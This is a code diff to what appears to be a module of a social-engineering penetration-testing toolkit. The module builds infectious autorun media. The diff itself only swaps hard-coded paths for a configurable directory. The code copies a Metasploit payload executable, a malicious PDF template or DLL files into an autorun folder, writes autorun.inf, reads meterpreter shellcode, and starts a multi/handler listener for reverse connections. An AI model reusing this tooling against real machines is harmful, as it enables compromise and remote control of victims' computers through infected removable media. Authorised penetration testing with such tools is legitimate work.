@@ -18,23 +18,23 @@ msf_path = meta_path()
 me = mod_name()
 
 trigger = 0
-if os.path.isfile("src/program_junk/standardpayload.file"):
+if os.path.isfile(setdir + "/standardpayload.file"):
     trigger = 1
-    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp src/program_junk/msf.exe autorun/program.exe 1> /dev/null 2> /dev/null;cp src/program_junk/msf.exe autorun/program.exe 1> /dev/null 2>/dev/null", shell=True).wait()
-if os.path.isfile("src/program_junk/fileformat.file"):
+    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp %s/msf.exe autorun/program.exe 1> /dev/null 2> /dev/null;cp %s/msf.exe autorun/program.exe 1> /dev/null 2>/dev/null" % (setdir,setdir), shell=True).wait()
+if os.path.isfile(setdir + "/fileformat.file"):
     trigger = 2
-    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp src/program_junk/template.pdf autorun/ 1> /dev/null 2>/dev/null", shell=True).wait()
+    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp %s/template.pdf autorun/ 1> /dev/null 2>/dev/null" % (setdir), shell=True).wait()
 
-if os.path.isfile("src/program_junk/dll/openthis.wab"):
-    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp src/program_junk/dll/* autorun/ 1> /dev/null 2> /dev/null", shell=True).wait()
+if os.path.isfile(setdir + "/dll/openthis.wab"):
+    subprocess.Popen("rm -rf autorun/ 1> /dev/null 2> /dev/null;mkdir autorun;cp %s/dll/* autorun/ 1> /dev/null 2> /dev/null" % (setdir), shell=True).wait()
     trigger = 3
 
 filewrite = file("autorun/autorun.inf", "w")
 
 # if we are using shellcodeexec
 alpha_data = ""
-if os.path.isfile("src/program_junk/meterpreter.alpha"):
-    fileopen = file("src/program_junk/meterpreter.alpha", "r")
+if os.path.isfile(setdir + "/meterpreter.alpha"):
+    fileopen = file(setdir + "/meterpreter.alpha", "r")
     alpha_data = fileopen.read().rstrip()
 
 
@@ -62,8 +62,8 @@ if trigger == 2 or trigger == 3:
     choice1 = yesno_prompt("0", "Create a listener right now [yes|no]")
 # j0fer 06-27-2012 #    if choice1 == "yes" or choice1 == "y" or choice1 == "":
     if choice1 == "YES":
-        filewrite = file("src/program_junk/meta_config", "w")
-        fileopen = file("src/program_junk/payload.options", "r")
+        filewrite = file(setdir + "/meta_config", "w")
+        fileopen = file(setdir + "/payload.options", "r")
         for line in fileopen:
             line = line.split(" ")
             filewrite.write("use multi/handler\n")
@@ -72,7 +72,7 @@ if trigger == 2 or trigger == 3:
             filewrite.write("set lport " + line[2] + "\n")
             filewrite.write("exploit -j")
             filewrite.close()
-        subprocess.Popen("ruby %s/msfconsole -L -n -r %s/src/program_junk/meta_config" % (msf_path, definepath), shell=True).wait()
+        subprocess.Popen("ruby %s/msfconsole -L -n -r %s/meta_config" % (msf_path, setdir), shell=True).wait()
     else:
         print_warning("cancelling...")
         sleep (2)
